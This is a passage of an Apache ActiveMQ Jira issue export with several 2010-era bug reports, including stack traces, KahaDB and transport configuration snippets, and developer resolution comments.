The exception thrown on the server side is also propagated to the client side and appears there as well as the additional exception that is thrown on the client side.

This is the stack trace on the server side:
{code}
java.util.ConcurrentModificationException
        at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)
        at java.util.HashMap$EntryIterator.next(HashMap.java:834)
        at java.util.HashMap$EntryIterator.next(HashMap.java:832)
        at java.util.HashMap.putAllForCreate(HashMap.java:435)
        at java.util.HashMap.<init>(HashMap.java:225)
        at org.apache.activemq.command.Message.copy(Message.java:120)
        at org.apache.activemq.command.ActiveMQMessage.copy(ActiveMQMessage.java:64)
        at org.apache.activemq.command.ActiveMQObjectMessage.copy(ActiveMQObjectMessage.java:81)
        at org.apache.activemq.command.ActiveMQObjectMessage.copy(ActiveMQObjectMessage.java:75)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:88)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)
        at org.apache.activemq.broker.util.LoggingBrokerPlugin.send(LoggingBrokerPlugin.java:280)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:446)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)
        at java.lang.Thread.run(Thread.java:619)
{code}","Linux version 2.6.18-92.1.13.el5
Java 1.6.0_18",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74778,,,Mon Jul 19 15:00:40 UTC 2010,,,,,,,,,,,"0|i0rpp3:",159807,,,,,,,,,,,,,,,,,,,,,"19/Jul/10 15:00;gtully;resolved in r965517 - logger needs to copy the message before delegating. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Possible replay of old messages post index recovery from journal - data files containing acks reclaimed/cleaned up in error,AMQ-2832,12482705,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,gtully,gtully,16/Jul/10 14:05,13/Feb/14 11:13,14/Jul/23 05:43,15/Apr/13 18:17,5.3.2,,,,,5.4.0,5.9.0,,Broker,,,,0,,,,,,,,,"With long lived messages and outstanding acks, ack distribution can be sparse across data files. If a data file is in use (still has unreferenced messages, the data files containing acks for all those messages also need to be maintained to ensure a replay of the journal replays the corresponding acks. Currently it is possible that data files with no unreferenced messages but with acks pertinent to an in use data file can get deleted. The result is duplicate or relay of old messages after journal recovery (following a crash/restart)",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5048,,,,,,,,,,,,,AMQ-4212,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74779,,,Mon Apr 15 18:17:19 UTC 2013,,,,,,,,,,,"0|i0rqrr:",159981,,,,,,,,,,,,,,,,,,,,,"19/Jul/10 09:18;gtully;resolved in  r964804 KahaDB store and  r964866 AMQ store

Data files containing only acks for messages in referenced data files are now excluded from cleanup till the dependent message file is eligible for cleanup.;;;","11/Apr/13 17:55;tabish;Unfortunately this wasn't really fully fixed.  The tracking of acks isn't persistent so a broker restart between the acks and the recovery can lose track of the ack and allow its data file to be deleted resulting in a recovered message that was previously consumed to be redispatched. ;;;","11/Apr/13 17:55;tabish;Both share the issue of losing track of an ack in a data file that's GC'd;;;","15/Apr/13 18:17;tabish;New fix and tests on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set ClientID - InvalidClientIDException with http transport,AMQ-2831,12483467,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,gtully,rjtokenlanring,rjtokenlanring,16/Jul/10 11:49,01/Sep/10 10:27,14/Jul/23 05:43,01/Sep/10 10:25,5.3.2,,,,,5.4.1,,,Transport,,,,0,,,,,,,,,"I have a client that do a durable subscriptio to a topic.
It register with a static client id.

After a connectivity loss (an so a new re-connection), this exception is thrown and connection cannot be
re-established:

2010-07-15 13:49:04,700 ERROR - javax.jms.InvalidClientIDException: Broker: localhost - Client: (SchedulerId = '1') already connected from blockingQueue_8461294
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:216)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:82)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:82)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:77)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:82)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:82)
....

This is not possible, because is the only client with that name and previos connection was closed . .close().

If I kill all the clients an I leave active only the broker,
If I try to reconnect using http (or tcp) I get the same error.
So client is not de-registered.
This appens also if I use failover protocol. After client kill/restart. Same exception is raised (javax.jms.InvalidClientIDException - with the clientID of the killed client).

I have to restart broker in order to register again the client. 

A test case is attached. 
If you connect to http the first time, connection is ok.
If you kill the JVM and the try to restart the test case, 'myclid already connected from blockingQueue_' is always raised. Also after some hours. I have to restart the broker in order to have a new conection with that client id.

This test simulate a JVM crash with no resource cleanup.
",,shbehna@gmail.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2764,"16/Jul/10 11:49;rjtokenlanring;TestVaseClientID.zip;https://issues.apache.org/jira/secure/attachment/12461767/TestVaseClientID.zip","16/Jul/10 11:50;rjtokenlanring;broker-config.xml;https://issues.apache.org/jira/secure/attachment/12461768/broker-config.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74780,,,Wed Sep 01 10:27:38 UTC 2010,,,,,,,,,,,"0|i0rphz:",159775,,,,,,,,,,,,,,,,,,,,,"16/Jul/10 11:49;rjtokenlanring;Test case class;;;","16/Jul/10 11:50;rjtokenlanring;Broker configuration;;;","01/Sep/10 07:49;rjtokenlanring;And related to this bug, I can report a related problem.
The http transport maintains a cache of the connected clients and doesn't flush it. If I restart the client, It cannot reconnect until I restart the broker:

javax.jms.JMSException: Could not connect to broker URL: http://server:61617/broker003. Reason: java.io.IOException: Failed to perform GET on: http://server:61617/broker003 as response was: 400
at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:35)
at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:286)
at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:230)
at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:178)
....;;;","01/Sep/10 10:25;gtully;The http transport now has an inactivity monitor, configure the http transport url with a low inactivity timeout value and the server end of the http transport will timeout when the client jvm crashes.

{code}http://localhost:61617??transport.readCheckTime=4000&amp;transport.initialDelayTime=4000{code};;;","01/Sep/10 10:27;gtully;This issue is resolved by the fix for AMQ-2764;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB configuration of properties archiveDataLogs & directoryArchive,AMQ-2830,12482614,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,sougandhgm,sougandhgm,16/Jul/10 10:28,16/Jul/10 10:57,14/Jul/23 05:43,16/Jul/10 10:57,5.3.2,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"  Test Config:
  <persistenceAdapter>
            <kahaDB directory=""${activemq.base}/data/kahadb"" 
		journalMaxFileLength=""32mb"" 
		archiveDataLogs=""true""
		directoryArchive=""${activemq.base}/archivedmsgs""
		maxAsyncJobs=""10000""
		databaseLockedWaitDelay=""10000""/>
        </persistenceAdapter>


Unable to configure archiveDataLogs=""true"", directoryArchive=""${activemq.base}/archivedmsgs"", databaseLockedWaitDelay=""10000""
Throws similar errors for all the mentioned attributes.
Keeps throwing th below error.

0_20\jre
  Heap sizes: current=15872k  free=14582k  max=506816k
    JVM args: -Dcom.sun.management.jmxremote -Xmx512M -Dorg.apache.activemq.UseD
edicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dact
ivemq.classpath=C:\Program Files (x86)\apache-activemq-5.3.2\bin\../conf; -Dacti
vemq.home=C:\Program Files (x86)\apache-activemq-5.3.2\bin\.. -Dactivemq.base=C:
\Program Files (x86)\apache-activemq-5.3.2\bin\..
ACTIVEMQ_HOME: C:\Program Files (x86)\apache-activemq-5.3.2\bin\..
ACTIVEMQ_BASE: C:\Program Files (x86)\apache-activemq-5.3.2\bin\..
Loading message broker from: xbean:file:C:/Program%20Files%20(x86)/apache-active
mq-5.3.2/conf/activemq-stomp1.xml
ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.spr
ingframework.beans.factory.BeanCreationException: Error creating bean with name
'org.apache.activemq.xbean.XBeanBrokerService#0' defined in URL [file:C:/Program
 Files (x86)/apache-activemq-5.3.2/conf/activemq-stomp1.xml]: Cannot create inne
r bean '(inner bean)' of type [org.apache.activemq.store.kahadb.KahaDBPersistenc
eAdapter] while setting bean property 'persistenceAdapter'; nested exception is
org.springframework.beans.factory.BeanCreationException: Error creating bean wit
h name '(inner bean)#1' defined in URL [file:C:/Program Files (x86)/apache-activ
emq-5.3.2/conf/activemq-stomp1.xml]: Error setting property values; nested excep
tion is org.springframework.beans.NotWritablePropertyException: Invalid property
 'directoryArchive' of bean class [org.apache.activemq.store.kahadb.KahaDBPersis
tenceAdapter]: Bean property 'directoryArchive' is not writable or has an invali
d setter method. Does the parameter type of the setter match the return type of
the getter?
java.lang.RuntimeException: Failed to execute start task. Reason: org.springfram
ework.beans.factory.BeanCreationException: Error creating bean with name 'org.ap
ache.activemq.xbean.XBeanBrokerService#0' defined in URL [file:C:/Program Files
(x86)/apache-activemq-5.3.2/conf/activemq-stomp1.xml]: Cannot create inner bean
'(inner bean)' of type [org.apache.activemq.store.kahadb.KahaDBPersistenceAdapte
r] while setting bean property 'persistenceAdapter'; nested exception is org.spr
ingframework.beans.factory.BeanCreationException: Error creating bean with name
'(inner bean)#1' defined in URL [file:C:/Program Files (x86)/apache-activemq-5.3
.2/conf/activemq-stomp1.xml]: Error setting property values; nested exception is
 org.springframework.beans.NotWritablePropertyException: Invalid property 'direc
toryArchive' of bean class [org.apache.activemq.store.kahadb.KahaDBPersistenceAd
apter]: Bean property 'directoryArchive' is not writable or has an invalid sette
r method. Does the parameter type of the setter match the return type of the get
ter?
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand
.java:98)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractC
ommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand
.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractC
ommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.ja
va:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creati
ng bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in UR
L [file:C:/Program Files (x86)/apache-activemq-5.3.2/conf/activemq-stomp1.xml]:
Cannot create inner bean '(inner bean)' of type [org.apache.activemq.store.kahad
b.KahaDBPersistenceAdapter] while setting bean property 'persistenceAdapter'; ne
sted exception is org.springframework.beans.factory.BeanCreationException: Error
 creating bean with name '(inner bean)#1' defined in URL [file:C:/Program Files
(x86)/apache-activemq-5.3.2/conf/activemq-stomp1.xml]: Error setting property va
lues; nested exception is org.springframework.beans.NotWritablePropertyException
: Invalid property 'directoryArchive' of bean class [org.apache.activemq.store.k
ahadb.KahaDBPersistenceAdapter]: Bean property 'directoryArchive' is not writabl
e or has an invalid setter method. Does the parameter type of the setter match t
he return type of the getter?
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver
.resolveInnerBean(BeanDefinitionValueResolver.java:230)
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver
.resolveValueIfNecessary(BeanDefinitionValueResolver.java:122)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1245)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getOb
ject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistr
y.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBe
an(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean
(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean
(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.
preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finish
BeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refres
h(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(
ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(
ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext
(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBroker
Factory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.j
ava:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.j
ava:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCom
mand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand
.java:91)
        ... 10 more
Caused by: org.springframework.beans.factory.BeanCreationException: Error creati
ng bean with name '(inner bean)#1' defined in URL [file:C:/Program Files (x86)/a
pache-activemq-5.3.2/conf/activemq-stomp1.xml]: Error setting property values; n
ested exception is org.springframework.beans.NotWritablePropertyException: Inval
id property 'directoryArchive' of bean class [org.apache.activemq.store.kahadb.K
ahaDBPersistenceAdapter]: Bean property 'directoryArchive' is not writable or ha
s an invalid setter method. Does the parameter type of the setter match the retu
rn type of the getter?
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1279)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver
.resolveInnerBean(BeanDefinitionValueResolver.java:219)
        ... 33 more
Caused by: org.springframework.beans.NotWritablePropertyException: Invalid prope
rty 'directoryArchive' of bean class [org.apache.activemq.store.kahadb.KahaDBPer
sistenceAdapter]: Bean property 'directoryArchive' is not writable or has an inv
alid setter method. Does the parameter type of the setter match the return type
of the getter?
        at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrappe
rImpl.java:801)
        at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrappe
rImpl.java:651)
        at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(
AbstractPropertyAccessor.java:78)
        at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(
AbstractPropertyAccessor.java:59)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1276)
        ... 39 more
ERROR: java.lang.Exception: org.springframework.beans.factory.BeanCreationExcept
ion: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService
#0' defined in URL [file:C:/Program Files (x86)/apache-activemq-5.3.2/conf/activ
emq-stomp1.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.act
ivemq.store.kahadb.KahaDBPersistenceAdapter] while setting bean property 'persis
tenceAdapter'; nested exception is org.springframework.beans.factory.BeanCreatio
nException: Error creating bean with name '(inner bean)#1' defined in URL [file:
C:/Program Files (x86)/apache-activemq-5.3.2/conf/activemq-stomp1.xml]: Error se
tting property values; nested exception is org.springframework.beans.NotWritable
PropertyException: Invalid property 'directoryArchive' of bean class [org.apache
.activemq.store.kahadb.KahaDBPersistenceAdapter]: Bean property 'directoryArchiv
e' is not writable or has an invalid setter method. Does the parameter type of t
he setter match the return type of the getter?
java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Er
ror creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' def
ined in URL [file:C:/Program Files (x86)/apache-activemq-5.3.2/conf/activemq-sto
mp1.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.s
tore.kahadb.KahaDBPersistenceAdapter] while setting bean property 'persistenceAd
apter'; nested exception is org.springframework.beans.factory.BeanCreationExcept
ion: Error creating bean with name '(inner bean)#1' defined in URL [file:C:/Prog
ram Files (x86)/apache-activemq-5.3.2/conf/activemq-stomp1.xml]: Error setting p
roperty values; nested exception is org.springframework.beans.NotWritablePropert
yException: Invalid property 'directoryArchive' of bean class [org.apache.active
mq.store.kahadb.KahaDBPersistenceAdapter]: Bean property 'directoryArchive' is n
ot writable or has an invalid setter method. Does the parameter type of the sett
er match the return type of the getter?
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand
.java:99)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractC
ommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand
.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractC
ommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.ja
va:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creati
ng bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in UR
L [file:C:/Program Files (x86)/apache-activemq-5.3.2/conf/activemq-stomp1.xml]:
Cannot create inner bean '(inner bean)' of type [org.apache.activemq.store.kahad
b.KahaDBPersistenceAdapter] while setting bean property 'persistenceAdapter'; ne
sted exception is org.springframework.beans.factory.BeanCreationException: Error
 creating bean with name '(inner bean)#1' defined in URL [file:C:/Program Files
(x86)/apache-activemq-5.3.2/conf/activemq-stomp1.xml]: Error setting property va
lues; nested exception is org.springframework.beans.NotWritablePropertyException
: Invalid property 'directoryArchive' of bean class [org.apache.activemq.store.k
ahadb.KahaDBPersistenceAdapter]: Bean property 'directoryArchive' is not writabl
e or has an invalid setter method. Does the parameter type of the setter match t
he return type of the getter?
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver
.resolveInnerBean(BeanDefinitionValueResolver.java:230)
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver
.resolveValueIfNecessary(BeanDefinitionValueResolver.java:122)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1245)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getOb
ject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistr
y.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBe
an(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean
(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean
(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.
preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finish
BeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refres
h(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(
ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(
ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext
(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBroker
Factory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.j
ava:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.j
ava:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCom
mand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand
.java:91)
        ... 10 more
Caused by: org.springframework.beans.factory.BeanCreationException: Error creati
ng bean with name '(inner bean)#1' defined in URL [file:C:/Program Files (x86)/a
pache-activemq-5.3.2/conf/activemq-stomp1.xml]: Error setting property values; n
ested exception is org.springframework.beans.NotWritablePropertyException: Inval
id property 'directoryArchive' of bean class [org.apache.activemq.store.kahadb.K
ahaDBPersistenceAdapter]: Bean property 'directoryArchive' is not writable or ha
s an invalid setter method. Does the parameter type of the setter match the retu
rn type of the getter?
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1279)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver
.resolveInnerBean(BeanDefinitionValueResolver.java:219)
        ... 33 more
Caused by: org.springframework.beans.NotWritablePropertyException: Invalid prope
rty 'directoryArchive' of bean class [org.apache.activemq.store.kahadb.KahaDBPer
sistenceAdapter]: Bean property 'directoryArchive' is not writable or has an inv
alid setter method. Does the parameter type of the setter match the return type
of the getter?
        at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrappe
rImpl.java:801)
        at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrappe
rImpl.java:651)
        at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(
AbstractPropertyAccessor.java:78)
        at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(
AbstractPropertyAccessor.java:59)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBean
Factory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1276)
        ... 39 more
C:\Program Files (x86)\apache-activemq-5.3.2\bin>","Windows 7,",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74781,,,Fri Jul 16 10:57:49 UTC 2010,,,,,,,,,,,"0|i0rqqv:",159977,,,,,,,,,,,,,,,,,,,,,"16/Jul/10 10:57;gtully;These attributes are exposed in version 5.4 - try a 5.4-SNAPSHOT -  I updated the doc page to indicate same;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker connection string does not allow both failover and compression,AMQ-2828,12482602,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jrobens,jrobens,15/Jul/10 10:43,27/Jul/10 12:56,14/Jul/23 05:43,27/Jul/10 12:56,5.3.0,,,,,,,,Connector,,,,0,,,,,,,,,"This works (spring resources.groovy in grails): 


_jmsConnectionFactory(ActiveMQConnectionFactory) {
        brokerURL = tcp://localhost:61616?jms.useCompression=true
      }


So does this: 
_jmsConnectionFactory(ActiveMQConnectionFactory) {
        brokerURL = failover:(tcp://localhost:61616)
  }


But this doesn't 
_jmsConnectionFactory(ActiveMQConnectionFactory) {
        brokerURL = failover:(tcp://localhost:61616?jms.useCompression=true)
  }


Error message is: 
195562 [ActiveMQ Task] DEBUG org.apache.activemq.transport.failover.FailoverTransport  - Connect fail to: tcp://localhost:61616?jms.useCompression=true, reason: java.lang.IllegalArgumentException: Invalid connect parameters: {jms.useCompression=true}

Had a look at the code and it does seem to say this by default.


